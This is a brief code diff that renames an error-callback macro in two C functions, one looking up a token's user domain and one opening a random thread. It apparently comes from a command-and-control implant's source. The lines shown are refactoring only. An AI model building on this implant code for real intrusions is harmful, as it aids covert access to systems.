@@ -252,7 +252,7 @@ PCHAR TokenGetUserDomain( HANDLE hToken, PDWORD UserSize )
     if ( ! Instance->Win32.LookupAccountSidA( NULL, ( ( PTOKEN_USER ) TokenUserInfo )->User.Sid, UserName, &UserNameSize, Domain, &DomainSize, &SidType ) )
     {
         PRINTF( "[%s] LookupAccountSidA failed: %d\n", __FUNCTION__, NtGetLastError() );
-        SEND_WIN32_BACK
+        CALLBACK_GETLASTERROR
         return NULL;
     }
 
@@ -703,7 +703,7 @@ HANDLE W32GetRandomThread()
                             PRINTF( "NtOpenThread: Failed: [%d]\n", Instance->Win32.RtlNtStatusToDosError( NtStatus ) )
 
                         NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
-                        SEND_WIN32_BACK
+                        CALLBACK_GETLASTERROR
                     }
                 }
             }
